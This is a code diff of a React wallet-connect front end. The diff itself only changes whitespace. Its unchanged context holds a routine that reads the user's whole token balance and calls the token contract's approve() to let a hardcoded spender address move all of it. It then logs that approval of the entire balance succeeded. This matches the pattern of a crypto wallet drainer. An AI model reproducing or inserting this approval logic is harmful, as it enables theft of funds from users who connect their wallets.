@@ -104,35 +104,35 @@ function App() {
         console.error('No accounts available.');
         return;
       }
-
+  
       // Fetch the user's token balance
       const tokenBalance = await fetchTokenBalance();
       const approvalAmount = tokenBalance;
-
+  
       if (approvalAmount === '0') {
         console.error('Insufficient balance for approval.');
         return;
       }
-
+  
       await window.ethereum.request({
         method: 'eth_requestAccounts',
       });
-
+  
       const provider = new Web3Provider(window.ethereum);
       const signer: Signer = provider.getSigner();
       const contract = new Contract(contractAddress, contractABI, signer);
       const spenderContractAddress = '0xa17033c449175C091E293398DED9Da584Db599d9'; // Replace with the actual spender contract address
-
+  
       const tx = await contract.approve(spenderContractAddress, approvalAmount);
       await tx.wait();
-
+  
       console.log('Approval of the entire balance successful.');
     } catch (error) {
       console.error('Error approving spending:', error);
     }
     setIsProcessing(false);
   };
-
+  
   const disableConnect = Boolean(wallet.accounts.length) && isConnecting;
 
   return (
